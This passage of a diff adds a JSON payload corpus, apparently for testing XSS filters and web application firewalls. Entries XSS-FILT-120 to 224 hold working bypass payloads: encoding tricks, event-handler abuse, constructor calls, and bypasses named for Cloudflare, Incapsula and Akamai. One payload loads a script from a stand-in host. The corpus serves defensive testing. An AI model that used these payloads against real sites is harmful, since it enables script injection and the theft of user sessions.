@@ -1,0 +1,1242 @@
+[
+  {
+      "id": "XSS-FILT-120",
+      "payload": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+      "tags": [
+        "filter-bypass",
+        "utf-7",
+        "encoding",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via UTF-7 encoding",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-121",
+      "payload": "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
+      "tags": [
+        "filter-bypass",
+        "unicode-escape",
+        "encoding"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via Unicode escape sequences",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-122",
+      "payload": "<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>",
+      "tags": [
+        "filter-bypass",
+        "hex-escape",
+        "encoding"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via hex escape sequences",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-123",
+      "payload": "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
+      "tags": [
+        "filter-bypass",
+        "eval",
+        "hex"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Filter bypass via eval with hex encoding",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-124",
+      "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+      "tags": [
+        "filter-bypass",
+        "fromCharCode",
+        "encoding"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Filter bypass via String.fromCharCode",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-125",
+      "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+      "tags": [
+        "filter-bypass",
+        "base64",
+        "atob"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Filter bypass via Base64 decoding (atob)",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-126",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "tags": [
+        "filter-bypass",
+        "html-entities",
+        "decimal",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via decimal HTML entities",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-127",
+      "payload": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+      "tags": [
+        "filter-bypass",
+        "html-entities",
+        "hex"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via hexadecimal HTML entities",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-128",
+      "payload": "<ScRiPt>alert(1)</sCrIpT>",
+      "tags": [
+        "filter-bypass",
+        "mixed-case",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via mixed case tag names",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-129",
+      "payload": "<script>a\\u006cert(1)</script>",
+      "tags": [
+        "filter-bypass",
+        "partial-unicode"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via partial Unicode in function name",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-130",
+      "payload": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
+      "tags": [
+        "filter-bypass",
+        "attribute",
+        "entities"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via HTML entities in attribute",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-131",
+      "payload": "<img src=x onerror='\\u0061\\u006c\\u0065\\u0072\\u0074(1)'>",
+      "tags": [
+        "filter-bypass",
+        "attribute",
+        "unicode"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via Unicode in attribute value",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-132",
+      "payload": "<script>/**/alert(1)/**/</script>",
+      "tags": [
+        "filter-bypass",
+        "comment",
+        "whitespace"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Filter bypass via comments as whitespace",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-133",
+      "payload": "<svg><script>alert&#40;1&#41;</script></svg>",
+      "tags": [
+        "filter-bypass",
+        "svg",
+        "entities"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via HTML entities in SVG",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-134",
+      "payload": "<img src=x onerror=alert`1`>",
+      "tags": [
+        "filter-bypass",
+        "template-literal",
+        "backtick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Filter bypass via ES6 template literal syntax",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-135",
+      "payload": "<svg/onload=alert(1)>",
+      "tags": ["filter-bypass", "svg", "no-space"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "No space between tag and attribute",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-136",
+      "payload": "<svg\tonload=alert(1)>",
+      "tags": ["filter-bypass", "tab", "whitespace"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Tab character as separator",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-137",
+      "payload": "<svg\nonload=alert(1)>",
+      "tags": ["filter-bypass", "newline", "whitespace"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Newline as attribute separator",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-138",
+      "payload": "<svg\ronload=alert(1)>",
+      "tags": ["filter-bypass", "carriage-return", "whitespace"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Carriage return as separator",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-139",
+      "payload": "<svg\u000Conload=alert(1)>",
+      "tags": ["filter-bypass", "form-feed", "whitespace"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Form feed character (0x0C) as separator",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-140",
+      "payload": "<img src=x onerror\u000B=alert(1)>",
+      "tags": ["filter-bypass", "vertical-tab"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Vertical tab before equals sign",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-141",
+      "payload": "<img src=1 onerror\u0000=alert(1)>",
+      "tags": ["filter-bypass", "null-byte"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Null byte before equals in attribute",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-142",
+      "payload": "<%00script>alert(1)</script>",
+      "tags": ["filter-bypass", "null-byte", "tag"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Null byte after opening bracket",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-143",
+      "payload": "<script>onerror=alert;throw 1</script>",
+      "tags": ["filter-bypass", "throw", "onerror"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Parenthesis bypass via throw/onerror",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-144",
+      "payload": "<script>{onerror=alert}throw 1</script>",
+      "tags": ["filter-bypass", "throw", "block"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Block statement throw bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-145",
+      "payload": "<script>throw onerror=alert,'some string',123,'haha'</script>",
+      "tags": ["filter-bypass", "throw", "comma"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Comma operator in throw statement",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-146",
+      "payload": "<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>",
+      "tags": ["filter-bypass", "prototype", "advanced"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Prototype pollution for XSS",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-147",
+      "payload": "<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>",
+      "tags": ["filter-bypass", "advanced", "regex"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Complex throw bypass with URL object",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-148",
+      "payload": "eval('ale'+'rt(0)')",
+      "tags": ["filter-bypass", "concat", "eval"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "String concatenation bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-149",
+      "payload": "Function('ale'+'rt(1)')()",
+      "tags": ["filter-bypass", "Function", "constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Function constructor bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-150",
+      "payload": "new Function`al\\ert\\`6\\``",
+      "tags": ["filter-bypass", "template", "constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Template literal Function constructor",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-151",
+      "payload": "setTimeout('ale'+'rt(2)')",
+      "tags": ["filter-bypass", "setTimeout", "concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "setTimeout string concat bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-152",
+      "payload": "setInterval('ale'+'rt(10)')",
+      "tags": ["filter-bypass", "setInterval", "concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "setInterval string concat bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-153",
+      "payload": "Set.constructor('ale'+'rt(13)')()",
+      "tags": ["filter-bypass", "Set", "constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Set constructor bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-154",
+      "payload": "Set.constructor`al\\x65rt\\x2814\\x29```",
+      "tags": ["filter-bypass", "hex", "template"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Set constructor hex escape template",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-155",
+      "payload": "window['alert'](0)",
+      "tags": ["filter-bypass", "bracket", "notation"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Bracket notation for function call",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-156",
+      "payload": "parent['alert'](1)",
+      "tags": ["filter-bypass", "parent", "bracket"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Parent window bracket access",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-157",
+      "payload": "self['alert'](2)",
+      "tags": ["filter-bypass", "self", "bracket"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Self reference bracket access",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-158",
+      "payload": "top['alert'](3)",
+      "tags": ["filter-bypass", "top", "bracket"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Top window bracket access",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-159",
+      "payload": "this['alert'](4)",
+      "tags": ["filter-bypass", "this", "bracket"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "This reference bracket access",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-160",
+      "payload": "frames['alert'](5)",
+      "tags": ["filter-bypass", "frames", "bracket"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Frames object bracket access",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-161",
+      "payload": "content['alert'](6)",
+      "tags": ["filter-bypass", "content", "bracket"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Content window bracket access",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-162",
+      "payload": "[7].map(alert)",
+      "tags": ["filter-bypass", "array", "map"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Array map to call alert",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-163",
+      "payload": "[8].find(alert)",
+      "tags": ["filter-bypass", "array", "find"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Array find to call alert",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-164",
+      "payload": "[9].every(alert)",
+      "tags": ["filter-bypass", "array", "every"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Array every to call alert",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-165",
+      "payload": "[10].filter(alert)",
+      "tags": ["filter-bypass", "array", "filter"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Array filter to call alert",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-166",
+      "payload": "[11].findIndex(alert)",
+      "tags": ["filter-bypass", "array", "findIndex"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Array findIndex to call alert",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-167",
+      "payload": "[12].forEach(alert)",
+      "tags": ["filter-bypass", "array", "forEach"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Array forEach to call alert",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-168",
+      "payload": "top[8680439..toString(30)](7)",
+      "tags": ["filter-bypass", "radix", "obfuscation"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Number toString radix bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-169",
+      "payload": "top[/al/.source+/ert/.source](8)",
+      "tags": ["filter-bypass", "regex", "source"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Regex source concatenation",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-170",
+      "payload": "top['al\\x65rt'](9)",
+      "tags": ["filter-bypass", "hex", "escape"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Hex escape in string",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-171",
+      "payload": "prompt`${document.domain}`",
+      "tags": ["filter-bypass", "template", "tagged"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Tagged template literal",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-172",
+      "payload": "document.location='java\\tscript:alert(1)'",
+      "tags": ["filter-bypass", "tab", "javascript"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Tab in javascript protocol",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-173",
+      "payload": "document.location='java\\rscript:alert(1)'",
+      "tags": ["filter-bypass", "carriage-return", "javascript"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Carriage return in javascript protocol",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-174",
+      "payload": "document.location='java\\nscript:alert(1)'",
+      "tags": ["filter-bypass", "newline", "javascript"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Newline in javascript protocol",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-175",
+      "payload": "open('java'+'script:ale'+'rt(11)')",
+      "tags": ["filter-bypass", "open", "concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Window.open with concatenation",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-176",
+      "payload": "location='javascript:ale'+'rt(12)'",
+      "tags": ["filter-bypass", "location", "concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Location assignment with concat",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-177",
+      "payload": "setTimeout`alert\\u0028document.domain\\u0029`",
+      "tags": ["filter-bypass", "template", "unicode"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "setTimeout template with unicode",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-178",
+      "payload": "[].filter.constructor('ale'+'rt(4)')()",
+      "tags": ["filter-bypass", "constructor", "array"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Array filter constructor",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-179",
+      "payload": "<div id=x></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>",
+      "tags": ["filter-bypass", "document", "dom"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Document blacklist bypass via DOM traversal",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-180",
+      "payload": "window['doc'+'ument']",
+      "tags": ["filter-bypass", "document", "concat"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Document access via concatenation",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-181",
+      "payload": "window.cookieStore.get('session').then((c)=>{alert(c.value)})",
+      "tags": ["filter-bypass", "cookieStore", "api"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CookieStore API bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-182",
+      "payload": "<svg onload=alert(1)//",
+      "tags": ["filter-bypass", "unclosed", "svg"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "No closing bracket needed",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-183",
+      "payload": "＜script/src=//evil.site/poc.js＞",
+      "tags": ["filter-bypass", "fullwidth", "unicode"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Fullwidth Unicode less/greater than",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-184",
+      "payload": "'te' * alert('*') * 'xt'",
+      "tags": ["filter-bypass", "semicolon", "operator"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Semicolon bypass with multiplication",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-185",
+      "payload": "'te' , alert(',') , 'xt'",
+      "tags": ["filter-bypass", "semicolon", "comma"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Semicolon bypass with comma operator",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-186",
+      "payload": "'te' ? alert('ifelse') : 'xt'",
+      "tags": ["filter-bypass", "semicolon", "ternary"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Semicolon bypass with ternary",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-187",
+      "payload": "'te' in alert('in') in 'xt'",
+      "tags": ["filter-bypass", "semicolon", "in"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Semicolon bypass with in operator",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-188",
+      "payload": "%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE",
+      "tags": ["filter-bypass", "utf-8", "overlong"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "UTF-8 overlong encoding bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-189",
+      "payload": "%E0%80%BCscript%E0%80%BEalert(1)%E0%80%BC/script%E0%80%BE",
+      "tags": ["filter-bypass", "utf-8", "three-byte"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "UTF-8 three-byte overlong encoding",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-190",
+      "payload": "%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00",
+      "tags": ["filter-bypass", "utf-16be"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "UTF-16BE encoding bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-191",
+      "payload": "%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E",
+      "tags": ["filter-bypass", "bom", "utf-16"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "BOM UTF-16 bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-192",
+      "payload": "javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()",
+      "tags": ["filter-bypass", "katakana", "jsfuck"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Katakana JS bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-193",
+      "payload": "<object onafterscriptexecute=confirm(0)>",
+      "tags": ["filter-bypass", "object", "event"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Less known event handler",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-194",
+      "payload": "<object onbeforescriptexecute=confirm(0)>",
+      "tags": ["filter-bypass", "object", "event"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Before script execute event",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-195",
+      "payload": "<img src='1' onerror/=alert(0) />",
+      "tags": ["filter-bypass", "slash", "attribute"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Slash before equals bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-196",
+      "payload": "<img/src='1'/onerror=alert(0)>",
+      "tags": ["filter-bypass", "slash", "separator"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Slash as space replacement",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-197",
+      "payload": "<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>",
+      "tags": ["filter-bypass", "html-entity", "ecmascript6"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "HTML entity grave accent ES6",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-198",
+      "payload": "javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'",
+      "tags": ["filter-bypass", "octal", "encoding"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Octal encoding bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-199",
+      "payload": "\"><svg/onload=alert(1)>",
+      "tags": ["filter-bypass", "attribute-escape", "quick"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Double quote attribute escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-200",
+      "payload": "'><svg/onload=alert(1)>",
+      "tags": ["filter-bypass", "attribute-escape", "quick"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Single quote attribute escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-201",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "tags": ["filter-bypass", "breakout", "quick"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Quote breakout with img",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-202",
+      "payload": "</script><script>alert(1)</script>",
+      "tags": ["filter-bypass", "script-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Script context escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-203",
+      "payload": "'-alert(1)-'",
+      "tags": ["filter-bypass", "string-context"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "String context injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-204",
+      "payload": "\\'-alert(1)//",
+      "tags": ["filter-bypass", "escape-escape"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Escaping the escape character",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-205",
+      "payload": "</title><script>alert(1)</script>",
+      "tags": ["filter-bypass", "title-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Title tag escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-206",
+      "payload": "</textarea><script>alert(1)</script>",
+      "tags": ["filter-bypass", "textarea-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Textarea escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-207",
+      "payload": "</style><script>alert(1)</script>",
+      "tags": ["filter-bypass", "style-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Style tag escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-208",
+      "payload": "<!--><script>alert(1)</script>-->",
+      "tags": ["filter-bypass", "comment"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "HTML comment bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-209",
+      "payload": "<![CDATA[><script>alert(1)</script>]]>",
+      "tags": ["filter-bypass", "cdata", "xml"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "CDATA section bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-210",
+      "payload": "<x]><script>alert(1)</script>",
+      "tags": ["filter-bypass", "malformed"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Malformed tag bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-211",
+      "payload": "<svg/onrandom=random onload=confirm(1)>",
+      "tags": ["waf-bypass", "cloudflare", "onrandom"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via random event handler",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-212",
+      "payload": "<video onnull=null onmouseover=confirm(1)>",
+      "tags": ["waf-bypass", "cloudflare", "onnull"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via null event handler",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-213",
+      "payload": "<svg/OnLoad=\"`${prompt``}`\">",
+      "tags": ["waf-bypass", "cloudflare", "template-literal"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via template literal",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-214",
+      "payload": "<svg/onload=%26nbsp;alert`bohdan`+",
+      "tags": ["waf-bypass", "cloudflare", "nbsp"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via HTML entity space",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-215",
+      "payload": "1'\"><img/src/onerror=.1|alert``>",
+      "tags": ["waf-bypass", "cloudflare", "bitwise"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via bitwise OR",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-216",
+      "payload": "<svg onload=prompt%26%230000000040document.domain)>",
+      "tags": ["waf-bypass", "cloudflare", "encoded-paren"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via encoded parenthesis",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-217",
+      "payload": "<svg onload=prompt%26%23x000000028;document.domain)>",
+      "tags": ["waf-bypass", "cloudflare", "hex-encoded"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via hex encoded paren",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-218",
+      "payload": "xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>",
+      "tags": ["waf-bypass", "cloudflare", "srcdoc"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via iframe srcdoc",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-219",
+      "payload": "<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
+      "tags": ["waf-bypass", "cloudflare", "mixed-entities"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via mixed HTML entities",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-220",
+      "payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>",
+      "tags": ["waf-bypass", "cloudflare", "tab-entities"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cloudflare WAF bypass via Tab and NewLine entities",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-221",
+      "payload": "<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>",
+      "tags": ["waf-bypass", "incapsula", "newline"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Incapsula WAF bypass via CRLF in event handler",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-222",
+      "payload": "anythinglr00</script><script>alert(document.domain)</script>uxldz",
+      "tags": ["waf-bypass", "incapsula", "script-break"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Incapsula WAF bypass via script tag injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-223",
+      "payload": "anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz",
+      "tags": ["waf-bypass", "incapsula", "url-encoded"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Incapsula WAF bypass URL encoded script tags",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-224",
+      "payload": "?\"></script><base%20c%3D=href%3Dhttps:\\mysite>",
+      "tags": ["waf-bypass", "akamai", "base-tag"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Akamai WAF bypass via base tag injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-FILT-225",
